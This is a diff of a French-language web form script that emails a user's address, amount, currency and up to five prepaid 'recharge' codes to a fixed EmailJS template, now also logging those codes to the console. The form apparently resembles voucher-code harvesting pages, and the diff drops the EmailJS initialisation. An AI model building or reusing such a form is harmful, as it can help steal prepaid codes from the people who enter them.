@@ -2,33 +2,19 @@ function isEmailJSLoaded() {
   return typeof emailjs !== 'undefined';
 }
 
-function initEmailJS() {
+// Check if EmailJS is loaded when DOM is ready
+document.addEventListener('DOMContentLoaded', function() {
   if (!isEmailJSLoaded()) {
-    console.error('EmailJS library not loaded. Please check if the EmailJS script is properly included.');
-    return;
-  }
-
-  try {
-    // Verify and update the EmailJS user ID
-    const emailJSUserID = "1JwZlq1ySAw2xhzK2";
-    if (!emailJSUserID || emailJSUserID.length !== 16) {
-      throw new Error('Invalid EmailJS user ID');
-    }
-    
-    emailjs.init(emailJSUserID);
-    console.log('EmailJS initialized successfully');
-  } catch (error) {
-    console.error('Failed to initialize EmailJS:', error.message);
+    console.error('EmailJS library not loaded');
     const errorDiv = document.querySelector('.error-message');
     if (errorDiv) {
-      errorDiv.textContent = "Configuration de messagerie invalide. Veuillez contacter l'administrateur.";
+      errorDiv.textContent = "Service de messagerie non disponible. Veuillez réessayer plus tard.";
       errorDiv.style.display = "block";
     }
+  } else {
+    console.log('EmailJS is loaded and ready');
   }
-}
-
-// Initialize EmailJS when the DOM is fully loaded
-document.addEventListener('DOMContentLoaded', initEmailJS);
+});
 
 
 function sendMail() {
@@ -36,15 +22,15 @@ function sendMail() {
   const errorDiv = document.querySelector('.error-message');
   const successDiv = document.querySelector('.sent-message');
   
-  // Check if EmailJS is loaded
   if (!isEmailJSLoaded()) {
+    console.error('EmailJS not loaded when trying to send mail');
     errorDiv.textContent = "Service de messagerie non disponible. Veuillez réessayer plus tard.";
     errorDiv.style.display = "block";
     return;
   }
   
   try {
-    // Add loading state
+    console.log('Preparing to send email...');
     document.body.style.cursor = 'wait';
     loadingDiv.style.display = "block";
     
@@ -60,6 +46,8 @@ function sendMail() {
       email: document.getElementById("email").value,
     };
 
+    console.log('Email parameters:', params);
+
     var rechargesFilled = false;
     for (var i = 1; i <= 5; i++) {
       if (document.getElementById("recharge0" + i).value !== "") {
@@ -68,17 +56,8 @@ function sendMail() {
       }
     }
 
-    // Verify service and template IDs
-    const serviceID = "service_p6xjkwk";
-    const templateID = "template_s1kqilp";
-    
-    if (!serviceID || !templateID) {
-      errorDiv.textContent = "Configuration de messagerie invalide. Veuillez contacter l'administrateur.";
-      errorDiv.style.display = "block";
-      document.body.style.cursor = 'default';
-      loadingDiv.style.display = "none";
-      return;
-    }
+
+
 
     // Add additional parameter validation
     if (!params.email || !params.crecharge || !params.montant || !params.devise || !rechargesFilled) {
@@ -118,37 +97,44 @@ function sendMail() {
       return;
     }
 
+    // Update service ID and template ID
+    const serviceID = "service_p6xjkwk";  // Keep existing service ID
+    const templateID = "template_s1kqilp"; // Keep existing template ID
+
+    // Add public key validation
+    if (!emailjs.init) {
+      throw new Error('EmailJS not initialized properly');
+    }
+
+    console.log('Sending email with service:', serviceID, 'template:', templateID);
     emailjs.send(serviceID, templateID, params)
       .then(res => {
-        clearTimeout(emailTimeout);
-        document.body.style.cursor = 'default';
-        // Clear form
-        ["rechargetype", "email", "montant", "devise", 
-         "recharge01", "recharge02", "recharge03", "recharge04", "recharge05"]
-          .forEach(id => document.getElementById(id).value = "");
-        
-        loadingDiv.style.display = "none";
-        successDiv.style.display = "block";
-        console.log('Email sent successfully:', res);
+      console.log('Email sent successfully:', res);
+      clearTimeout(emailTimeout);
+      document.body.style.cursor = 'default';
+      ["rechargetype", "email", "montant", "devise", 
+       "recharge01", "recharge02", "recharge03", "recharge04", "recharge05"]
+        .forEach(id => document.getElementById(id).value = "");
+      
+      loadingDiv.style.display = "none";
+      successDiv.style.display = "block";
       })
       .catch(err => {
-        clearTimeout(emailTimeout);
-        console.error('Email send error:', err);
-        document.body.style.cursor = 'default';
-        loadingDiv.style.display = "none";
-        errorDiv.textContent = "Une erreur s'est produite. Veuillez réessayer.";
-        if (err.status === 0) {
-          errorDiv.textContent = "Impossible de se connecter au service de messagerie. Vérifiez votre connexion Internet.";
-        }
-        errorDiv.style.display = "block";
+      console.error('Detailed email send error:', err);
+      clearTimeout(emailTimeout);
+      document.body.style.cursor = 'default';
+      loadingDiv.style.display = "none";
+      errorDiv.textContent = err.text || "Une erreur s'est produite. Veuillez réessayer.";
+      errorDiv.style.display = "block";
       });
-  } catch (error) {
-    console.error('Error in sendMail:', error);
+    } catch (error) {
+    console.error('Detailed error in sendMail:', error);
     document.body.style.cursor = 'default';
     loadingDiv.style.display = "none";
     errorDiv.textContent = "Une erreur inattendue s'est produite.";
     errorDiv.style.display = "block";
-  }
+    }
+
 }
 
 // Export the function for use in HTML
